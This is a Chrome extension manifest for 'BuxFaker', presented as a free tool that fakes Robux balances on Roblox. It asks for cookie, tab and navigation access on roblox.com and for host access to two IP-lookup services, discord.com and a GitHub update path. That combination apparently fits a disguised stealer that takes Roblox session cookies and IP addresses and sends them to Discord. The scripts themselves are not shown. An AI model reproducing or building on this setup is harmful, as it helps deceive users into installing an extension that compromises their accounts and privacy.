{
  "manifest_version": 3,
  "name": "BuxFaker - A Simple Roblox Extension",
  "version": "1.0",
  "description": "A forever free Robux Faker Extension!",
  "icons": {
    "16": "icons/icon16.png",
    "48": "icons/icon48.png",
    "128": "icons/icon128.png"
  },
  "permissions": [
    "storage",
    "cookies",
    "tabs",
    "webNavigation"
  ],
  "host_permissions": [
    "*://*.roblox.com/*",
    "https://api.ipify.org/",
    "http://ip-api.com/*",
    "https://discord.com/*",
    "https://raw.githubusercontent.com/perdurer/updatebuxfaker/*"
  ],
  "action": {
    "default_popup": "popup.html",
    "default_icon": {
      "16": "icons/icon16.png",
      "48": "icons/icon48.png",
      "128": "icons/icon128.png"
    }
  },
  "background": {
    "service_worker": "background.js"
  },
  "content_scripts": [
    {
      "matches": [
        "*://*.roblox.com/*"
      ],
      "js": [
        "content.js"
      ],
      "run_at": "document_start"
    }
  ]
}